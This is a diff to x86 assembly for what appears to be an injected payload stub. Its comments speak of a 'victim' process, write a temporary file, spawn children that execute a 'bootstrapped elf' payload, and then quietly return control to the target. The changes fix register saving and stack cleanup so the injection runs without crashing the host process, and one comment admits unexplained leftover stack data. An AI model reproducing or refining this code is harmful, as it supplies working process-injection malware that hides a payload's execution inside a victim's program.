@@ -17,6 +17,7 @@ _start:
   mov %esp,%ebp
   push %esi
   push %edi
+  push %ebx
  
 ################################################################################
 # Open our temporary file
@@ -62,7 +63,7 @@ _save_info:
 #we want the write sys call
   movl $0x04, %eax
   int $0x80
- 
+
 ################################################################################
 # Close our temporary file
 ################################################################################
@@ -75,7 +76,7 @@ _save_info:
 # Spawn 2 Children
 ################################################################################
 #push a "struct pt_regs" on to the stack in reverse order
-  movl %esp, %ebx
+  movl %esp, %edi
   push %ebx
   push %ecx
   push %edx
@@ -125,7 +126,7 @@ _save_info:
 # Reap both of our children and gracefully return
 ################################################################################
   pop %ecx #the process id of the victim
-  movl %ebx, %esp #pop the register struct off the stack
+  movl %edi, %esp #pop the register struct off the stack
   pop %edx #remove the exe path from the stack also
 
   mov $0, %ebx #we want to wait for all children
@@ -151,7 +152,7 @@ _save_info:
 # Execute the bootstrapped elf
 ################################################################################
 _spawn_payload:
-  movl %ebx, %esp #pop the register struct off the stack
+  movl %edi, %esp #pop the register struct off the stack
 #load the file string
   pop %ebx
 #Create an array of string pointers on the stack or ARGV and ENV
@@ -168,25 +169,27 @@ _spawn_payload:
 ################################################################################
 _sys_exit:
   movl $0, %ebx
-  movl $0x01, %eax # exit(3c)
+  movl $0x01, %eax # exit
   int $0x80
 
 ################################################################################
 # Return control to the victim 
 ################################################################################
 _return_to_target:
-  movl %ebx, %esp #pop the register struct
-  pop %ecx
+  movl %edi, %esp #pop the register struct
 #pop the location of the file path string
   pop %ecx
 #pop off all our strings
-  pop ecx
-  pop ecx
-  pop ecx
-  pop ecx
-  pop ecx
+  pop %ecx
+  pop %ecx
+  pop %ecx
+  pop %ecx
+  pop %ecx
+#Duno what, but there is something else bad on the stack at this point
+  pop %ecx
 
 #return
+  pop %ebx
   pop %edi
   pop %esi
   pop %ebp
